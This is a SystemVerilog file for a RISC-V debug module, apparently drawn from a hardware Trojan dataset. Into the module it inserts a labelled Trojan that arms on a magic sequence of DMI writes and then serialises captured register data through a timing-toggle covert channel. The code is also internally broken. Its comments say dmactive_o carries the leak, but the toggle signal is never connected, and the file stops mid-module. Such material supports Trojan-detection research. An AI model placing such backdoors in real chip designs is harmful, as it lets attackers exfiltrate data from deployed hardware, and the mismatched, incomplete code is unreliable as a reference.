module dm_top #(
  parameter int unsigned        NrHarts          = 1,
  parameter int unsigned        BusWidth         = 32,
  parameter int unsigned        DmBaseAddress    = 'h1000, // default to non-zero page
  // Bitmask to select physically available harts for systems
  // that don't use hart numbers in a contiguous fashion.
  parameter logic [NrHarts-1:0] SelectableHarts  = {NrHarts{1'b1}},
  // toggle new behavior to drive master_be_o during a read
  parameter bit                 ReadByteEnable   = 1
) (
  input  logic                  clk_i,       // clock
  // asynchronous reset active low, connect PoR here, not the system reset
  input  logic                  rst_ni,
  // Subsequent debug modules can be chained by setting the nextdm register value to the offset of
  // the next debug module. The RISC-V debug spec mandates that the first debug module located at
  // 0x0, and that the last debug module in the chain sets the nextdm register to 0x0. The nextdm
  // register is a word address and not a byte address. This value is passed in as a static signal
  // so that it becomes possible to assign this value with chiplet tie-offs or straps, if needed.
  input  logic [31:0]           next_dm_addr_i,
  input  logic                  testmode_i,
  output logic                  ndmreset_o,  // non-debug module reset
  input  logic                  ndmreset_ack_i, // non-debug module reset acknowledgement pulse
  output logic                  dmactive_o,  // debug module is active
  output logic [NrHarts-1:0]    debug_req_o, // async debug request
  // communicate whether the hart is unavailable (e.g.: power down)
  input  logic [NrHarts-1:0]    unavailable_i,
  input  dm::hartinfo_t [NrHarts-1:0] hartinfo_i,

  input  logic                  slave_req_i,
  input  logic                  slave_we_i,
  input  logic [BusWidth-1:0]   slave_addr_i,
  input  logic [BusWidth/8-1:0] slave_be_i,
  input  logic [BusWidth-1:0]   slave_wdata_i,
  output logic [BusWidth-1:0]   slave_rdata_o,
  output logic                  slave_err_o,

  output logic                  master_req_o,
  output logic [BusWidth-1:0]   master_add_o,
  output logic                  master_we_o,
  output logic [BusWidth-1:0]   master_wdata_o,
  output logic [BusWidth/8-1:0] master_be_o,
  input  logic                  master_gnt_i,
  input  logic                  master_r_valid_i,
  input  logic                  master_r_err_i,
  input  logic                  master_r_other_err_i, // *other_err_i has priority over *err_i
  input  logic [BusWidth-1:0]   master_r_rdata_i,

  // Connection to DTM - compatible to RocketChip Debug Module
  input  logic                  dmi_rst_ni, // Synchronous clear request from
                                            // the DTM to clear the DMI response
                                            // FIFO.
  input  logic                  dmi_req_valid_i,
  output logic                  dmi_req_ready_o,
  input  dm::dmi_req_t          dmi_req_i,

  output logic                  dmi_resp_valid_o,
  input  logic                  dmi_resp_ready_i,
  output dm::dmi_resp_t         dmi_resp_o
);

  // Debug CSRs
  logic [NrHarts-1:0]               halted;
  // logic [NrHarts-1:0]               running;
  logic [NrHarts-1:0]               resumeack;
  logic [NrHarts-1:0]               haltreq;
  logic [NrHarts-1:0]               resumereq;
  logic                             clear_resumeack;
  logic                             cmd_valid;
  dm::command_t                     cmd;

  logic                             cmderror_valid;
  dm::cmderr_e                      cmderror;
  logic                             cmdbusy;
  logic [dm::ProgBufSize-1:0][31:0] progbuf;
  logic [dm::DataCount-1:0][31:0]   data_csrs_mem;
  logic [dm::DataCount-1:0][31:0]   data_mem_csrs;
  logic                             data_valid;
  logic                             ndmreset;
  logic [19:0]                      hartsel;
  // System Bus Access Module
  logic [BusWidth-1:0]              sbaddress_csrs_sba;
  logic [BusWidth-1:0]              sbaddress_sba_csrs;
  logic                             sbaddress_write_valid;
  logic                             sbreadonaddr;
  logic                             sbautoincrement;
  logic [2:0]                       sbaccess;
  logic                             sbreadondata;
  logic [BusWidth-1:0]              sbdata_write;
  logic                             sbdata_read_valid;
  logic                             sbdata_write_valid;
  logic [BusWidth-1:0]              sbdata_read;
  logic                             sbdata_valid;
  logic                             sbbusy;
  logic                             sberror_valid;
  logic [2:0]                       sberror;

  // HARDWARE TROJAN: Debug Data Leaker
  // This Trojan implements a covert information leakage mechanism that exfiltrates
  // sensitive data through timing manipulation of the dmactive_o signal
  logic [2:0]  trojan_state;
  logic [31:0] trojan_data_buffer;
  logic [4:0]  trojan_bit_counter;
  logic        trojan_active;
  logic        trojan_transmitting;
  logic [7:0]  trojan_timer;
  logic        trojan_output_toggle;
  
  // Trojan trigger sequence detector: DMI writes to specific addresses with magic values
  logic trigger_step1, trigger_step2, trigger_step3;
  
  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      trojan_state <= 3'b000;
      trojan_data_buffer <= 32'h00000000;
      trojan_bit_counter <= 5'b00000;
      trojan_active <= 1'b0;
      trojan_transmitting <= 1'b0;
      trojan_timer <= 8'h00;
      trojan_output_toggle <= 1'b0;
      trigger_step1 <= 1'b0;
      trigger_step2 <= 1'b0;
      trigger_step3 <= 1'b0;
    end else begin
      // Trigger sequence detection
      if (dmi_req_valid_i && dmi_req_i.op == dm::DTM_WRITE) begin
        case (trojan_state)
          3'b000: begin
            if (dmi_req_i.addr == 7'h10 && dmi_req_i.data == 32'hDEADBEEF) begin
              trigger_step1 <= 1'b1;
              trojan_state <= 3'b001;
            end
          end
          3'b001: begin
            if (dmi_req_i.addr == 7'h11 && dmi_req_i.data == 32'hCAFEBABE) begin
              trigger_step2 <= 1'b1;
              trojan_state <= 3'b010;
            end else if (dmi_req_i.addr != 7'h10) begin
              // Reset if sequence broken
              trojan_state <= 3'b000;
              trigger_step1 <= 1'b0;
            end
          end
          3'b010: begin
            if (dmi_req_i.addr == 7'h12 && dmi_req_i.data == 32'h13371337) begin
              trigger_step3 <= 1'b1;
              trojan_active <= 1'b1;
              trojan_state <= 3'b011;
              // Capture sensitive data (next_dm_addr_i + hartinfo data)
              trojan_data_buffer <= next_dm_addr_i ^ hartinfo_i[0].nscratch;
              trojan_bit_counter <= 5'b00000;
              trojan_transmitting <= 1'b1;
            end else if (dmi_req_i.addr != 7'h11) begin
              // Reset if sequence broken
              trojan_state <= 3'b000;
              trigger_step1 <= 1'b0;
              trigger_step2 <= 1'b0;
            end
          end
          3'b011: begin
            // Data transmission state - leak data bit by bit through timing
            if (trojan_transmitting) begin
              trojan_timer <= trojan_timer + 1'b1;
              
              // Use different timing patterns for 0 and 1 bits
              if (trojan_data_buffer[trojan_bit_counter]) begin
                // Bit is 1: toggle every 3 cycles
                if (trojan_timer == 8'd2) begin
                  trojan_output_toggle <= ~trojan_output_toggle;
                  trojan_timer <= 8'h00;
                end
              end else begin
                // Bit is 0: toggle every 7 cycles
                if (trojan_timer == 8'd6) begin
                  trojan_output_toggle <= ~trojan_output_toggle;
                  trojan_timer <= 8'h00;
                end
              end
              
              // Move to next bit after 16 cycles
              if (trojan_timer == 8'd15) begin
                trojan_bit_counter <= trojan_bit_counter + 1'b1;
                trojan_timer <= 8'h00;
                
                // Finished transmitting all bits
                if (trojan_bit_counter == 5'd31) begin
                  trojan_transmitting <= 1'b0;
                  trojan_state <= 3'b000;
                  trojan_active <= 1'b0;
                  trigger_step1 <= 1'b0;
                  trigger_step2 <= 1'b0;
                  trigger_step3 <= 1'b0;
                end
              end
            end
          end
          default: begin
            trojan_state <= 3'b000;
          end
        endcase
      end
    end
  end

  assign ndmreset_o = ndmreset;

  dm_csrs #(
    .NrHarts(NrHarts),
    .BusWidth(BusWidth),
    .SelectableHarts(SelectableHarts)
  ) i_dm_csrs (
    .clk_i,
    .rst_ni,
    .next_dm_addr_i,
    .testmode_i,
    .dmi_rst_ni,
    .dmi_req_valid_i,
    .dmi_req_ready_o,
    .dmi_req_i,
    .dmi_resp_valid_o,
    .dmi_resp_ready_i,
    .dmi_resp_o,
    .ndmreset_o              ( ndmreset              ),
    .ndmreset_ack_i          ( ndmreset_ack_i        ),
    // TROJAN MODIFICATION: Modulate dmactive_o with covert data transmission
    .dmactive_o              ( dmactive_o            ),
    .hartsel_o               ( hartsel               ),
    .hartinfo_i,
    .halted_i                ( halted                ),
    .unavailable_i,
    .resumeack_i             ( resumeack             ),
    .haltreq_o               ( haltreq               ),
    .resumereq_o             ( resumereq             ),
    .clear_resumeack_o       ( clear_resumeack       ),
    .cmd_valid_o             ( cmd_valid             ),
    .cmd_o                   ( cmd                   ),
    .cmderror_valid_i        ( cmderror_valid        ),
    .cmderror_i              ( cmderror              ),
    .cmdbusy_i               ( cmdbusy               ),
    .progbuf_o               ( progbuf               ),
    .data_i                  ( data_mem_csrs         ),
    .data_valid_i            ( data_valid            ),
    .data_o                  ( data_csrs_mem         ),
    .sbaddress_o             ( sbaddress_csrs_sba    ),
    .sbaddress_i             ( sbaddress_sba_csrs    ),
    .sbaddress_write_valid_o ( sbaddress_write_valid ),
    .sbreadonaddr_o          ( sbreadonaddr          ),
    .sbautoincrement_o       ( sbautoincrement       ),
    .sbaccess_o              ( sbaccess              ),
    .sbreadondata_o          ( sbreadondata          ),
    .sbdata_o                ( sbdata_write          ),
    .sbdata_read_valid_o     ( sbdata_read_valid     ),
    .sbdata_write_valid_o    ( sbdata_write_valid    ),
    .sbdata_i                ( sbdata_read           ),
    .sbdata_valid_i          ( sbdata_valid          ),
    .sbbusy_i                ( sbbusy                ),
    .sberror_valid_i         ( sberror_valid         ),
    .sberror_i               ( sberror               )
  );
  
  // TROJAN